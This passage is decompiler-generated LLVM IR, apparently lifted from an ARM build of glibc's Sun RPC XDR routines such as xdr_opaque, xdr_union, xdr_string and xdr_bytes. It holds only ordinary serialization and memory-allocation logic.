  %v2_31914 = icmp eq i32 %v2_3190c, 0
  br i1 %v2_31914, label %bb11, label %bb10

bb10:                                             ; preds = %dec_label_pc_3190c
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_3190c, %bb10
  %v0_3191c = phi i32 [ 0, %dec_label_pc_3190c ], [ 1, %bb10 ]
  store i32 %v0_3191c, i32* %stack_var_-20, align 4
  %v1_31920 = add i32 %v0_318e4, 4
  %v2_31920 = inttoptr i32 %v1_31920 to i32*
  %v3_31920 = load i32, i32* %v2_31920, align 4
  %v1_31924 = add i32 %v3_31920, 4
  %v2_31924 = inttoptr i32 %v1_31924 to i32*
  %v3_31924 = load i32, i32* %v2_31924, align 4
  call void @__pseudo_branch(i32 %v3_31924)
  br label %dec_label_pc_3196c

dec_label_pc_31934:                               ; preds = %entry
  %v1_31934 = add i32 %v0_318e4, 4
  %v2_31934 = inttoptr i32 %v1_31934 to i32*
  %v3_31934 = load i32, i32* %v2_31934, align 4
  %v1_3193c = inttoptr i32 %v3_31934 to i32*
  %v2_3193c = load i32, i32* %v1_3193c, align 4
  call void @__pseudo_branch(i32 %v2_3193c)
  %v0_31948 = load i32, i32* %r0.global-to-local, align 4
  %v2_31948 = icmp eq i32 %v0_31948, 0
  br i1 %v2_31948, label %dec_label_pc_31968, label %dec_label_pc_31950

dec_label_pc_31950:                               ; preds = %dec_label_pc_31934
  %v3_31950 = load i32, i32* %stack_var_-20, align 4
  %v0_31954 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_31954, i32* %r0.global-to-local, align 4
  %v2_31958 = icmp eq i32 %v3_31950, 0
  br i1 %v2_31958, label %bb13, label %bb12

bb12:                                             ; preds = %dec_label_pc_31950
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_31950, %bb12
  %v0_31960 = phi i32 [ 0, %dec_label_pc_31950 ], [ 1, %bb12 ]
  %v1_31960 = load i32, i32* %r5.global-to-local, align 4
  %v2_31960 = inttoptr i32 %v1_31960 to i32*
  store i32 %v0_31960, i32* %v2_31960, align 4
  br label %dec_label_pc_3196c

dec_label_pc_31968:                               ; preds = %dec_label_pc_318fc, %dec_label_pc_31934
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3196c

dec_label_pc_3196c:                               ; preds = %bb, %bb13, %bb11, %dec_label_pc_31968
  %v2_31970 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_31970, i32* %r4.global-to-local, align 4
  %v1_31974 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_31974

; uselistorder directives
  uselistorder i32 %v2_318e4, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_3196c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_31968, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_31978 = call i32 @__GI_xdr_long()
  ret i32 %v0_31978
}

define i32 @xdr_opaque(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_3197c = load i32, i32* @r4, align 4
  store i32 %v3_3197c, i32* %stack_var_-16, align 4
  %v2_31984 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_31984, label %dec_label_pc_31a4c, label %dec_label_pc_31994

dec_label_pc_31994:                               ; preds = %entry
  %v2_31994 = load i32, i32* %arg1, align 4
  %v1_31998 = urem i32 %arg2, 4
  %v2_31998 = icmp eq i32 %v1_31998, 0
  %v2_319a0 = sub nsw i32 4, %v1_31998
  %storemerge = select i1 %v2_31998, i32 0, i32 %v2_319a0
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_319a4 = icmp eq i32 %v2_31994, 1
  br i1 %v7_319a4, label %dec_label_pc_319d8, label %dec_label_pc_319ac

dec_label_pc_319ac:                               ; preds = %dec_label_pc_31994
  %v2_319a4 = icmp eq i32 %v2_31994, 0
  br i1 %v2_319a4, label %dec_label_pc_31a20, label %dec_label_pc_319b0

dec_label_pc_319b0:                               ; preds = %dec_label_pc_319ac
  %v7_319b0 = icmp eq i32 %v2_31994, 2
  br i1 %v7_319b0, label %dec_label_pc_31a4c, label %dec_label_pc_31a54

dec_label_pc_319d8:                               ; preds = %dec_label_pc_31994
  %v1_319c0 = add i32 %tmp, 4
  %v2_319c0 = inttoptr i32 %v1_319c0 to i32*
  %v3_319c0 = load i32, i32* %v2_319c0, align 4
  %v1_319c4 = add i32 %v3_319c0, 8
  %v2_319c4 = inttoptr i32 %v1_319c4 to i32*
  %v3_319c4 = load i32, i32* %v2_319c4, align 4
  call void @__pseudo_branch(i32 %v3_319c4)
  %v0_319d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_319d8 = icmp eq i32 %v0_319d8, 0
  br i1 %v2_319d8, label %dec_label_pc_31a4c, label %dec_label_pc_319e0

dec_label_pc_319e0:                               ; preds = %dec_label_pc_319d8
  %v0_319e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_319e4, i32* %r0.global-to-local, align 4
  %v1_319f0 = add i32 %v0_319e4, 4
  %v2_319f0 = inttoptr i32 %v1_319f0 to i32*
  %v3_319f0 = load i32, i32* %v2_319f0, align 4
  %v1_319f4 = add i32 %v3_319f0, 8
  %v2_319f4 = inttoptr i32 %v1_319f4 to i32*
  %v3_319f4 = load i32, i32* %v2_319f4, align 4
  call void @__pseudo_branch(i32 %v3_319f4)
  br label %dec_label_pc_31a58

dec_label_pc_31a20:                               ; preds = %dec_label_pc_319ac
  %v1_31a08 = add i32 %tmp, 4
  %v2_31a08 = inttoptr i32 %v1_31a08 to i32*
  %v3_31a08 = load i32, i32* %v2_31a08, align 4
  %v1_31a0c = add i32 %v3_31a08, 12
  %v2_31a0c = inttoptr i32 %v1_31a0c to i32*
  %v3_31a0c = load i32, i32* %v2_31a0c, align 4
  call void @__pseudo_branch(i32 %v3_31a0c)
  %v0_31a20 = load i32, i32* %r5.global-to-local, align 4
  %v2_31a20 = icmp eq i32 %v0_31a20, 0
  br i1 %v2_31a20, label %dec_label_pc_31a4c, label %dec_label_pc_31a28

dec_label_pc_31a28:                               ; preds = %dec_label_pc_31a20
  %v0_31a2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_31a2c, i32* %r0.global-to-local, align 4
  %v1_31a38 = add i32 %v0_31a2c, 4
  %v2_31a38 = inttoptr i32 %v1_31a38 to i32*
  %v3_31a38 = load i32, i32* %v2_31a38, align 4
  %v1_31a3c = add i32 %v3_31a38, 12
  %v2_31a3c = inttoptr i32 %v1_31a3c to i32*
  %v3_31a3c = load i32, i32* %v2_31a3c, align 4
  call void @__pseudo_branch(i32 %v3_31a3c)
  br label %dec_label_pc_31a58

dec_label_pc_31a4c:                               ; preds = %dec_label_pc_319b0, %dec_label_pc_31a20, %dec_label_pc_319d8, %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31a58

dec_label_pc_31a54:                               ; preds = %dec_label_pc_319b0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31a58

dec_label_pc_31a58:                               ; preds = %dec_label_pc_31a4c, %dec_label_pc_31a28, %dec_label_pc_319e0, %dec_label_pc_31a54
  %v2_31a58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_31a58, i32* @r4, align 4
  %v1_31a5c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_31a5c

; uselistorder directives
  uselistorder i32 %v1_31998, { 1, 0 }
  uselistorder i32 %v2_31994, { 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_31a58, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_31a4c, { 1, 2, 0, 3 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_31a6c = load i32, i32* @r4, align 4
  store i32 %v3_31a6c, i32* %stack_var_-24, align 4
  %v0_31a74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_31a74, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v0_31a84 = call i32 @xdr_enum()
  store i32 %v0_31a84, i32* %r0.global-to-local, align 4
  %v2_31a88 = icmp eq i32 %v0_31a84, 0
  br i1 %v2_31a88, label %dec_label_pc_31ae8, label %dec_label_pc_31ac0.preheader

dec_label_pc_31ac0.preheader:                     ; preds = %entry
  %v1_31a8c = load i32, i32* %r5.global-to-local, align 4
  %v2_31a8c = inttoptr i32 %v1_31a8c to i32*
  %v3_31a8c = load i32, i32* %v2_31a8c, align 4
  store i32 %v3_31a8c, i32* %r1.global-to-local, align 4
  %v0_31ac011 = load i32, i32* %r4.global-to-local, align 4
  %v1_31ac012 = add i32 %v0_31ac011, 4
  %v2_31ac013 = inttoptr i32 %v1_31ac012 to i32*
  %v3_31ac014 = load i32, i32* %v2_31ac013, align 4
  %v2_31ac416 = icmp eq i32 %v3_31ac014, 0
  br i1 %v2_31ac416, label %dec_label_pc_31acc, label %dec_label_pc_31a98

dec_label_pc_31a98:                               ; preds = %dec_label_pc_31ac0.preheader, %dec_label_pc_31abc
  %v0_31abc = phi i32 [ %v1_31abc, %dec_label_pc_31abc ], [ %v0_31ac011, %dec_label_pc_31ac0.preheader ]
  %v3_31ac017 = phi i32 [ %v3_31ac0, %dec_label_pc_31abc ], [ %v3_31ac014, %dec_label_pc_31ac0.preheader ]
  %v1_31a98 = inttoptr i32 %v0_31abc to i32*
  %v2_31a98 = load i32, i32* %v1_31a98, align 4
  %v9_31a9c = icmp eq i32 %v2_31a98, %v3_31a8c
  br i1 %v9_31a9c, label %dec_label_pc_31aa4, label %dec_label_pc_31abc

dec_label_pc_31aa4:                               ; preds = %dec_label_pc_31a98
  %v0_31aa4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_31aa4, i32* %r0.global-to-local, align 4
  %v0_31aa8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_31aa8, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_31ac017)
  br label %dec_label_pc_31ae8

dec_label_pc_31abc:                               ; preds = %dec_label_pc_31a98
  %v1_31abc = add i32 %v0_31abc, 8
  store i32 %v1_31abc, i32* %r4.global-to-local, align 4
  %v1_31ac0 = add i32 %v0_31abc, 12
  %v2_31ac0 = inttoptr i32 %v1_31ac0 to i32*
  %v3_31ac0 = load i32, i32* %v2_31ac0, align 4
  %v2_31ac4 = icmp eq i32 %v3_31ac0, 0
  br i1 %v2_31ac4, label %dec_label_pc_31ac0.dec_label_pc_31acc_crit_edge, label %dec_label_pc_31a98

dec_label_pc_31ac0.dec_label_pc_31acc_crit_edge:  ; preds = %dec_label_pc_31abc
  br label %dec_label_pc_31acc

dec_label_pc_31acc:                               ; preds = %dec_label_pc_31ac0.dec_label_pc_31acc_crit_edge, %dec_label_pc_31ac0.preheader
  %v2_31acc = icmp eq i32 %arg5, 0
  br i1 %v2_31acc, label %bb, label %bb32

bb:                                               ; preds = %dec_label_pc_31acc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread6

bb32:                                             ; preds = %dec_label_pc_31acc
  %v1_31ad4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_31ad4, i32* %r0.global-to-local, align 4
  %v1_31ad88 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_31ad88, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb, %bb32
  %v2_31ae4 = xor i1 %v2_31acc, true
  call void @__pseudo_cond_branch(i1 %v2_31ae4, i32 %arg5)
  br label %dec_label_pc_31ae8

dec_label_pc_31ae8:                               ; preds = %entry, %dec_label_pc_31aa4, %.thread6
  %v2_31ae8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_31ae8, i32* %r4.global-to-local, align 4
  %v1_31aec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_31aec

; uselistorder directives
  uselistorder i32 %v3_31ac0, { 1, 0 }
  uselistorder i32 %v1_31abc, { 1, 0 }
  uselistorder i32 %v0_31abc, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 4, 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_31ae8, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_31a98, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_31af0 = load i32, i32* @r4, align 4
  store i32 %v3_31af0, i32* %stack_var_-24, align 4
  %v6_31af0 = load i32, i32* @r5, align 4
  %v9_31af0 = load i32, i32* @r6, align 4
  %v12_31af0 = load i32, i32* @r7, align 4
  %v15_31af0 = load i32, i32* @r8, align 4
  %v2_31af4 = load i32, i32* %arg1, align 4
  %v2_31afc = icmp eq i32 %v2_31af4, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  %v1_31b14 = inttoptr i32 %arg2 to i32*
  %v2_31b14 = load i32, i32* %v1_31b14, align 4
  store i32 %v2_31b14, i32* @r4, align 4
  br i1 %v2_31afc, label %dec_label_pc_31b30, label %dec_label_pc_31b1c

dec_label_pc_31b1c:                               ; preds = %entry
  %v7_31b1c = icmp eq i32 %v2_31af4, 2
  br i1 %v7_31b1c, label %dec_label_pc_31b24, label %dec_label_pc_31b44

dec_label_pc_31b24:                               ; preds = %dec_label_pc_31b1c
  %v2_31b24 = icmp eq i32 %v2_31b14, 0
  br i1 %v2_31b24, label %dec_label_pc_31bfc, label %dec_label_pc_31b38

dec_label_pc_31b30:                               ; preds = %entry
  %v2_31b30 = icmp eq i32 %v2_31b14, 0
  br i1 %v2_31b30, label %dec_label_pc_31c04, label %dec_label_pc_31b38

dec_label_pc_31b38:                               ; preds = %dec_label_pc_31b24, %dec_label_pc_31b30
  %v1_31b38 = inttoptr i32 %v2_31b14 to i8*
  store i32 %v2_31b14, i32* %r0.global-to-local, align 4
  %v3_31b3c = call i32 @strlen(i8* %v1_31b38)
  store i32 %v3_31b3c, i32* %r0.global-to-local, align 4
  store i32 %v3_31b3c, i32* %stack_var_-28, align 4
  %v0_31b44.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31b44

dec_label_pc_31b44:                               ; preds = %dec_label_pc_31b1c, %dec_label_pc_31b38
  %v0_31b44 = phi i32 [ %tmp, %dec_label_pc_31b1c ], [ %v0_31b44.pre, %dec_label_pc_31b38 ]
  store i32 %v0_31b44, i32* @r0, align 4
  %v2_31b48 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_31b48, i32* @r1, align 4
  %v2_31b4c = inttoptr i32 %v0_31b44 to i32*
  %v4_31b4c = call i32 @xdr_u_int(i32* %v2_31b4c, i32* nonnull %stack_var_-28)
  store i32 %v4_31b4c, i32* %r0.global-to-local, align 4
  %v2_31b50 = icmp eq i32 %v4_31b4c, 0
  br i1 %v2_31b50, label %dec_label_pc_31c04, label %dec_label_pc_31b58

dec_label_pc_31b58:                               ; preds = %dec_label_pc_31b44
  %v3_31b58 = load i32, i32* %stack_var_-28, align 4
  %v1_31b5c = load i32, i32* @r8, align 4
  %tmp16 = icmp ugt i32 %v3_31b58, %v1_31b5c
  br i1 %tmp16, label %dec_label_pc_31c04, label %dec_label_pc_31b64

dec_label_pc_31b64:                               ; preds = %dec_label_pc_31b58
  %v0_31b64 = load i32, i32* @r5, align 4
  %v1_31b64 = inttoptr i32 %v0_31b64 to i32*
  %v2_31b64 = load i32, i32* %v1_31b64, align 4
  %v7_31b68 = icmp eq i32 %v2_31b64, 1
  br i1 %v7_31b68, label %dec_label_pc_31b80, label %dec_label_pc_31b70

dec_label_pc_31b70:                               ; preds = %dec_label_pc_31b64
  %v2_31b68 = icmp eq i32 %v2_31b64, 0
  br i1 %v2_31b68, label %dec_label_pc_31bd0, label %dec_label_pc_31b74

dec_label_pc_31b74:                               ; preds = %dec_label_pc_31b70
  %v7_31b74 = icmp eq i32 %v2_31b64, 2
  br i1 %v7_31b74, label %dec_label_pc_31be4, label %dec_label_pc_31c04

dec_label_pc_31b80:                               ; preds = %dec_label_pc_31b64
  %v1_31b80 = add i32 %v3_31b58, 1
  store i32 %v1_31b80, i32* %r0.global-to-local, align 4
  %v7_31b80 = icmp eq i32 %v1_31b80, 0
  br i1 %v7_31b80, label %dec_label_pc_31bfc, label %dec_label_pc_31b88

dec_label_pc_31b88:                               ; preds = %dec_label_pc_31b80
  %v0_31b88 = load i32, i32* @r4, align 4
  %v2_31b88 = icmp eq i32 %v0_31b88, 0
  br i1 %v2_31b88, label %dec_label_pc_31b90, label %dec_label_pc_31bc4

dec_label_pc_31b90:                               ; preds = %dec_label_pc_31b88
  %v1_31b90 = call i32 @malloc(i32 %v1_31b80)
  store i32 %v1_31b90, i32* %r0.global-to-local, align 4
  %v2_31b94 = icmp eq i32 %v1_31b90, 0
  store i32 %v1_31b90, i32* @r4, align 4
  %v1_31b9c = load i32, i32* @r6, align 4
  %v2_31b9c = inttoptr i32 %v1_31b9c to i32*
  store i32 %v1_31b90, i32* %v2_31b9c, align 4
  br i1 %v2_31b94, label %dec_label_pc_31ba4, label %dec_label_pc_31b90.dec_label_pc_31bc4_crit_edge

dec_label_pc_31b90.dec_label_pc_31bc4_crit_edge:  ; preds = %dec_label_pc_31b90
  %v3_31bc4.pre = load i32, i32* %stack_var_-28, align 4
  %v2_31bcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_31bc4

dec_label_pc_31ba4:                               ; preds = %dec_label_pc_31b90
  store i32 -34188, i32* %r0.global-to-local, align 4
  %v0_31bac = load i32, i32* @r7, align 4
  %v2_31bac = add i32 %v0_31bac, 196
  %v3_31bac = inttoptr i32 %v2_31bac to i32*
  %v4_31bac = load i32, i32* %v3_31bac, align 4
  %v2_31bb0 = add i32 %v0_31bac, -34188
  store i32 %v2_31bb0, i32* %r0.global-to-local, align 4
  %v1_31bb4 = inttoptr i32 %v4_31bac to i32*
  %v2_31bb4 = load i32, i32* %v1_31bb4, align 4
  %v2_31bb8 = call i32 @__GI_fputs(i32 %v2_31bb0, i32 %v2_31bb4)
  %v0_31bbc = load i32, i32* @r4, align 4
  store i32 %v0_31bbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31c08

dec_label_pc_31bc4:                               ; preds = %dec_label_pc_31b90.dec_label_pc_31bc4_crit_edge, %dec_label_pc_31b88
  %v2_31bcc = phi i32 [ %v2_31bcc.pre, %dec_label_pc_31b90.dec_label_pc_31bc4_crit_edge ], [ %v0_31b88, %dec_label_pc_31b88 ]
  %v3_31bc4 = phi i32 [ %v3_31bc4.pre, %dec_label_pc_31b90.dec_label_pc_31bc4_crit_edge ], [ %v3_31b58, %dec_label_pc_31b88 ]
  %v4_31bcc = add i32 %v3_31bc4, %v2_31bcc
  %v5_31bcc = inttoptr i32 %v4_31bcc to i8*
  store i8 0, i8* %v5_31bcc, align 1
  %v0_31bd0.pre = load i32, i32* @r5, align 4
  %v3_31bd8.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_31bd0

dec_label_pc_31bd0:                               ; preds = %dec_label_pc_31b70, %dec_label_pc_31bc4
  %v3_31bd8 = phi i32 [ %v3_31b58, %dec_label_pc_31b70 ], [ %v3_31bd8.pre, %dec_label_pc_31bc4 ]
  %v0_31bd0 = phi i32 [ %v0_31b64, %dec_label_pc_31b70 ], [ %v0_31bd0.pre, %dec_label_pc_31bc4 ]
  store i32 %v0_31bd0, i32* %r0.global-to-local, align 4
  %v0_31bd4 = load i32, i32* @r4, align 4
  %v3_31bdc = inttoptr i32 %v0_31bd0 to i32*
  %v4_31bdc = call i32 @xdr_opaque(i32* %v3_31bdc, i32 %v0_31bd4, i32 %v3_31bd8)
  store i32 %v4_31bdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31c08

dec_label_pc_31be4:                               ; preds = %dec_label_pc_31b74
  %v0_31be4 = load i32, i32* @r4, align 4
  store i32 %v0_31be4, i32* @r0, align 4
  %v0_31be8 = call i32 @free()
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_31bf4 = load i32, i32* @r6, align 4
  %v2_31bf4 = inttoptr i32 %v1_31bf4 to i32*
  store i32 0, i32* %v2_31bf4, align 4
  %v1_31c10.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31c08

dec_label_pc_31bfc:                               ; preds = %dec_label_pc_31b24, %dec_label_pc_31b80
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31c08

dec_label_pc_31c04:                               ; preds = %dec_label_pc_31b74, %dec_label_pc_31b58, %dec_label_pc_31b44, %dec_label_pc_31b30
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31c08

dec_label_pc_31c08:                               ; preds = %dec_label_pc_31bfc, %dec_label_pc_31be4, %dec_label_pc_31bd0, %dec_label_pc_31ba4, %dec_label_pc_31c04
  %v1_31c10 = phi i32 [ 1, %dec_label_pc_31bfc ], [ %v1_31c10.pre, %dec_label_pc_31be4 ], [ %v4_31bdc, %dec_label_pc_31bd0 ], [ %v0_31bbc, %dec_label_pc_31ba4 ], [ 0, %dec_label_pc_31c04 ]
  %v2_31c0c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_31c0c, i32* @r4, align 4
  store i32 %v6_31af0, i32* @r5, align 4
  store i32 %v9_31af0, i32* @r6, align 4
  store i32 %v12_31af0, i32* @r7, align 4
  store i32 %v15_31af0, i32* @r8, align 4
  ret i32 %v1_31c10

; uselistorder directives
  uselistorder i32 %v0_31bd0, { 1, 0 }
  uselistorder i32 %v1_31b90, { 1, 0, 2, 3 }
  uselistorder i32 %v2_31b64, { 0, 2, 1 }
  uselistorder i32 %v3_31b58, { 1, 2, 3, 0 }
  uselistorder i32 %v0_31b44, { 1, 0 }
  uselistorder i32 %v2_31b14, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-28, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 9, 7, 8, 11, 10, 12, 14, 13, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_31c08, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_31bfc, { 1, 0 }
  uselistorder label %dec_label_pc_31bd0, { 1, 0 }
  uselistorder label %dec_label_pc_31b44, { 1, 0 }
  uselistorder label %dec_label_pc_31b38, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  %v0_31c2c = load i32, i32* @r0, align 4
  %v1_31c2c = load i32, i32* @r1, align 4
  %v3_31c2c = inttoptr i32 %v0_31c2c to i32*
  %v4_31c2c = call i32 @__GI_xdr_string(i32* %v3_31c2c, i32 %v1_31c2c, i32 -1)
  %v2_31c30 = icmp eq i32 %v4_31c2c, 0
  br i1 %v2_31c30, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_31c40 = phi i32 [ 0, %entry ], [ 1, %bb ]
  ret i32 %v1_31c40

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @xdr_bytes() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v3_31c44 = load i32, i32* @r4, align 4
  %v6_31c44 = load i32, i32* @r5, align 4
  %v9_31c44 = load i32, i32* @r6, align 4
  %v12_31c44 = load i32, i32* @r7, align 4
  %v15_31c44 = load i32, i32* @r8, align 4
  %v21_31c44 = load i32, i32* @lr, align 4
  %v0_31c48 = load i32, i32* @r1, align 4
  store i32 %v0_31c48, i32* @r8, align 4
  %v0_31c50 = load i32, i32* @r2, align 4
  store i32 %v0_31c50, i32* @r1, align 4
  store i32 %v0_31c50, i32* @r5, align 4
  %v0_31c58 = load i32, i32* @r3, align 4
  store i32 %v0_31c58, i32* @sl, align 4
  %v0_31c5c = load i32, i32* @r0, align 4
  store i32 %v0_31c5c, i32* @r6, align 4
  %v1_31c60 = inttoptr i32 %v0_31c48 to i32*
  %v2_31c60 = load i32, i32* %v1_31c60, align 4
  store i32 %v2_31c60, i32* @r4, align 4
  %v2_31c64 = inttoptr i32 %v0_31c50 to i32*
  %v4_31c64 = call i32 @xdr_u_int(i32* %v2_31c64, i32* %v2_31c64)
  store i32 %v4_31c64, i32* %r0.global-to-local, align 4
  %v2_31c6c = icmp eq i32 %v4_31c64, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  br i1 %v2_31c6c, label %dec_label_pc_31d2c, label %dec_label_pc_31c78

dec_label_pc_31c78:                               ; preds = %entry
  %v0_31c78 = load i32, i32* @r5, align 4
  %v1_31c78 = inttoptr i32 %v0_31c78 to i32*
  %v2_31c78 = load i32, i32* %v1_31c78, align 4
  store i32 %v2_31c78, i32* @r5, align 4
  %v1_31c7c = load i32, i32* @sl, align 4
  %tmp = icmp ugt i32 %v2_31c78, %v1_31c7c
  %v0_31c90.pre = load i32, i32* @r6, align 4
  %.pre = inttoptr i32 %v0_31c90.pre to i32*
  br i1 %tmp, label %dec_label_pc_31c84, label %dec_label_pc_31c90

dec_label_pc_31c84:                               ; preds = %dec_label_pc_31c78
  %v2_31c84 = load i32, i32* %.pre, align 4
  %v7_31c88 = icmp eq i32 %v2_31c84, 2
  br i1 %v7_31c88, label %dec_label_pc_31c90, label %dec_label_pc_31d2c

dec_label_pc_31c90:                               ; preds = %dec_label_pc_31c78, %dec_label_pc_31c84
  %v2_31c90 = load i32, i32* %.pre, align 4
  %v7_31c94 = icmp eq i32 %v2_31c90, 1
  br i1 %v7_31c94, label %dec_label_pc_31cac, label %dec_label_pc_31c9c

dec_label_pc_31c9c:                               ; preds = %dec_label_pc_31c90
  %v2_31c94 = icmp eq i32 %v2_31c90, 0
  br i1 %v2_31c94, label %dec_label_pc_31cf4, label %dec_label_pc_31ca0

dec_label_pc_31ca0:                               ; preds = %dec_label_pc_31c9c
  %v7_31ca0 = icmp eq i32 %v2_31c90, 2
  br i1 %v7_31ca0, label %dec_label_pc_31d0c, label %dec_label_pc_31d2c

dec_label_pc_31cac:                               ; preds = %dec_label_pc_31c90
  %v2_31cac = icmp eq i32 %v2_31c78, 0
  br i1 %v2_31cac, label %dec_label_pc_31d34, label %dec_label_pc_31cb4

dec_label_pc_31cb4:                               ; preds = %dec_label_pc_31cac
  %v0_31cb4 = load i32, i32* @r4, align 4
  %v2_31cb4 = icmp eq i32 %v0_31cb4, 0
  br i1 %v2_31cb4, label %dec_label_pc_31cbc, label %dec_label_pc_31cf4

dec_label_pc_31cbc:                               ; preds = %dec_label_pc_31cb4
  store i32 %v2_31c78, i32* %r0.global-to-local, align 4
  %v1_31cc0 = call i32 @malloc(i32 %v2_31c78)
  store i32 %v1_31cc0, i32* %r0.global-to-local, align 4
  %v2_31cc4 = icmp eq i32 %v1_31cc0, 0
  store i32 %v1_31cc0, i32* @r4, align 4
  %v1_31ccc = load i32, i32* @r8, align 4
  %v2_31ccc = inttoptr i32 %v1_31ccc to i32*
  store i32 %v1_31cc0, i32* %v2_31ccc, align 4
  br i1 %v2_31cc4, label %dec_label_pc_31cd4, label %dec_label_pc_31cbc.dec_label_pc_31cf4_crit_edge

dec_label_pc_31cbc.dec_label_pc_31cf4_crit_edge:  ; preds = %dec_label_pc_31cbc
  %v0_31cf4.pre = load i32, i32* @r6, align 4
  %v0_31cfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31cf4

dec_label_pc_31cd4:                               ; preds = %dec_label_pc_31cbc
  store i32 -34160, i32* %r0.global-to-local, align 4
  %v0_31cdc = load i32, i32* @r7, align 4
  %v2_31cdc = add i32 %v0_31cdc, 196
  %v3_31cdc = inttoptr i32 %v2_31cdc to i32*
  %v4_31cdc = load i32, i32* %v3_31cdc, align 4
  %v2_31ce0 = add i32 %v0_31cdc, -34160
  store i32 %v2_31ce0, i32* %r0.global-to-local, align 4
  %v1_31ce4 = inttoptr i32 %v4_31cdc to i32*
  %v2_31ce4 = load i32, i32* %v1_31ce4, align 4
